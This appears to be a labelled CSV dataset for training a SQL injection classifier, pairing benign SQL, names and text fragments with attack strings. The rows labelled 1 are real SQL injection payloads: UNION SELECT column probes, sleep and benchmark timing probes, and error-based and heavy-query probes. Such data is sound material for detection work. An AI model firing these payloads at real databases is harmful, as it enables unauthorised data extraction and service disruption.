Sentence,Label
49830,0
"1""   )    )     )   union all select null--",1
"1 )  union all select null,null,null,null,null,null,null,null,null,null--",1
"1' )  as bagi where 1281 = 1281  ( select  ( case when  ( 5451 = 5451 )  then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null )  else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 )  end )  from information_schema.system_users ) --",1
"INSERT INTO mass ( gain, written, lunch, allow, might, prove )  VALUES  ( 'suit', 'root'. pressure', 'given', 'lose', 'writer', 'country' )  ",0
SELECT * FROM curve WHERE NOT that = 'try'  AND NOT case = 'history',0
6448,0
chaplin,0
cimorra,0
h9655,0
SELECT COUNT ( explain ) FROM few,0
"1'  )  )   as lxjs where 6503 = 6503 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1 ) --",1
odden,0
"1%' )  and elt ( 1210 = 1210,sleep ( 5  )  )   and  ( '%' = '",1
"1'  )  )   as mjps where 2179 = 2179 union all select null,null,null,null,null,null,null--",1
-4960' )  union all select 5300--,1
"1 )  where 2679 = 2679 or 4915 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
SELECT * FROM enough FETCH FIRST 50 PERCENT ROWS ONLY,0
daciano,0
"1   )    )     )   union all select null,null,null,null,null,null,null,null--",1
"1%'   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
wara,0
1' rlike sleep  (  5  )   and 'cugs'  =  'cugs,1
"1   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
7496121103658289,0
SELECT * FROM customs WHERE fifty = 'many',0
SELECT * FROM team WHERE tax BETWEEN '1996-07-01' AND '1996-07-31',0
-9711'+  (  select 'ckpj' where 8338  =  8338 union all select 8338--,1
 Over eight month period January August 2011 sought illicitly obtain information arrests two men behalf Scarborough well one associates ,0
" The Regional Memorial Authority major say historic school wall renovation , even used filming ",0
magdalena,0
"1'  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  'yznd' like 'yznd",1
"select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5",1
SELECT * FROM canal WHERE world = 'vast' LIMIT 3,0
wenzel,0
lava,0
